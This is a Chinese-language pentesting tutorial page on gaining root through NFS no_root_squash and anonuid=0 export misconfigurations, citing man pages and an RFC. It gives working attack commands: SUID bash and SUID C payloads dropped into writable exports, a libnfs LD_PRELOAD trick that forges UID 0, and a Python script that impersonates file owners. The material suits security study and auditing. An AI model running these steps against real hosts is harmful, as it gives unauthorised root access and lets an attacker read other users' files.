# NFS No Root Squash 配置错误导致的权限提升

{{#include ../../banners/hacktricks-training.md}}

## Squashing 基本信息

使用 NFS AUTH_SYS/AUTH_UNIX 时，服务器会根据每个 RPC 请求中提供的 `uid` 和 `gid` 检查文件权限。Kerberos 等其他安全类型使用不同的凭据，服务器也可以在检查权限前映射数字凭据。<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**：将所有 UID 和 GID 映射到匿名账户；在 Linux 上，默认值为 `nobody`（65534）。对于非 root 请求，默认使用 `no_all_squash`。<sup>[[4]](#references)</sup>
- **`root_squash`**：这是 Linux 上的默认设置，会将 UID/GID 为 0（root）的请求映射到匿名账户；其他 UID 和 GID 不会被 squash。<sup>[[4]](#references)</sup>
- **`no_root_squash`**：禁用 root squashing，因此 UID/GID 为 0 的请求会在服务器上按 root 身份进行检查。<sup>[[4]](#references)</sup>

如果获准的客户端可以挂载 **`/etc/exports`** 中配置了 **`no_root_squash`** 的可写导出目录，那么该客户端的 UID/GID 0 请求便可以服务器 root 用户的身份向其中写入内容。<sup>[[4]](#references)</sup>

`root_squash` 只会重新映射 UID/GID 0；在 AUTH_SYS 下，获准客户端的**非零数字 UID/GID** 仍可能与服务器上的另一个账户匹配。因此，即使启用了 root squashing，如果客户端可以使用该数字身份创建文件，且服务器允许访问，可写导出目录仍可能成为跨用户路径。要进行 SUID/SGID 交接，还应确认生成文件的所有者、可执行访问权限、服务器挂载的 `nosuid` 状态、ACL，以及 SELinux 或其他策略。仅凭导出路径、`rw` 选项或匹配的数字，无法证明客户端获准访问、导出目录处于活动状态，或两台主机使用相同的有效身份映射。被动检查 `/etc/exports` 和本地元数据；枚举时不要挂载新共享或创建测试文件。<sup>[[4]](#references)[[5]](#references)</sup>

如需了解更多 **NFS** 信息，请查看：

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## 权限提升

### 等效于 root 的匿名映射

不要只检查是否设置了 `no_root_squash`。使用 `root_squash,anonuid=0,anongid=0` 时，客户端 UID/GID 为 0 的请求会被 squash **回 root**。使用 `all_squash,anonuid=0,anongid=0` 时，服务器会将客户端的非 root 身份也映射为 root。在可写的 `sec=sys` 导出目录上，这两种配置都可能提供下文 SUID 交接所需的 root 所有文件原语；但仍须满足客户端获准访问以及受害主机挂载方面的限制。<sup>[[4]](#references)</sup>

在服务器上，使用 `exportfs -v` 检查活动导出目录及其针对**匹配客户端**的选项，包括 `rw`、`sec=`、squash 模式以及 `anonuid`/`anongid`。检查配置时也应查看 `/etc/exports.d/*.exports`；仅查看 `/etc/exports` 可能无法看到完整配置。<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### 远程 Exploit

选项 1：使用 bash：
- 在获准的客户端上，以 root 身份挂载一个可写的导出目录，将 **`/bin/bash`** 复制到其中，设置其 **SUID** 位，然后从未使用 `nosuid` 的受害者挂载点执行它。<sup>[[2]](#references)[[4]](#references)</sup>
    - 要使上传的文件保持归属 root，服务器必须通过 **`no_root_squash`** 保留客户端的 UID 0，或通过 **`anonuid=0`** 将请求映射到 UID 0。否则，只有当客户端能以该账户的数字 UID/GID 创建或拥有文件时，才可能为其他账户创建 SUID 二进制文件。<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

选项 2：使用编译后的 C 代码：
- 从允许的客户端挂载该目录，复制一个滥用 SUID 权限的已编译 payload，将其设置为 **SUID** 位，然后在受害者机器上执行（参见一些 [C SUID payload](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)）。
    - 与之前相同的限制

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### 本地利用

> [!TIP]
> 请注意，如果你能从自己的机器到受害机器建立**隧道，仍可通过隧道转发所需端口，使用远程版本利用此权限提升漏洞**。\
> 如果 `/etc/exports` 将导出限制为受害机器的 IP，以下技巧会很有用：远程客户端无法挂载该导出，但本地技术可以通过已在允许的主机上挂载的共享进行操作。<sup>[[2]](#references)</sup>\
> 对于这种非特权 libnfs 方法，**`/etc/exports`** 中的导出必须使用 `insecure` 标志，以便进程使用非保留源端口；默认值为 `secure`，但能够绑定保留端口的进程不需要此选项。<sup>[[1]](#references)[[4]](#references)</sup>

### 基本信息

NFSv3 AUTH_UNIX 客户端会在每次调用中包含其有效 UID、GID 和组信息，服务器会使用这些信息进行权限检查。此本地技术通过 [libnfs](https://github.com/sahlberg/libnfs) 伪造 RPC 凭据，利用了这一机制；其 preload 模块支持覆盖 NFS 上下文中的 UID/GID。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### 编译库

libnfs 示例可能需要针对目标内核进行调整；此处使用的演练特别指出，编译 preload 模块前需要注释掉 fallocate 系统调用。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### 执行 Exploit

此示例会创建一个启动 shell 的小型 C 辅助程序，将其放到共享目录中，然后在 NFS 上下文中以 UID 0 使用 `ld_nfs.so`，使其成为 SUID-root。<sup>[[1]](#references)[[2]](#references)</sup>

1. **编译 exploit 代码：**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **将 exploit 放到共享目录中，并通过伪造 UID 修改其权限**。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **执行 exploit 以获取 root 权限**。<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus：NFShell 隐蔽文件访问

获取 root 权限后，此 `nfsh.py` 模式会在运行命令前将 effective UID 设置为目标文件的 UID，从而无需递归更改所有权即可访问文件。<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

运行方式如下：

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [一个鲜为人知的 NFS 提权案例](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813：NFS 版本 3 协议规范](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
